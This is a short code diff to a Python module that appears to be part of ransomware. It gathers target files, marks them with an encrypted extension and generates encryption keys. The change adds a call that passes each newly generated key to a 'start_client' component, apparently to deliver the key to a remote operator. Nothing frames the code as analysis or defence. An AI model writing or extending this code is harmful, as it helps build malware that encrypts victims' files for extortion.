@@ -4,15 +4,17 @@ import base64
 from pathlib import Path
 import time
 import copy
+from client import start_client
 from config import (
     TARGET_DIR,
-    ENCRYPTED_EXTENSION,
-    
+    ENCRYPTED_EXTENSION
+
 )
 from utils import get_all_target_files, is_safe_to_encrypt
 
 def generateKey():
     key = os.urandom(16)
+    start_client(key)
     return key
 
 def generateIv():
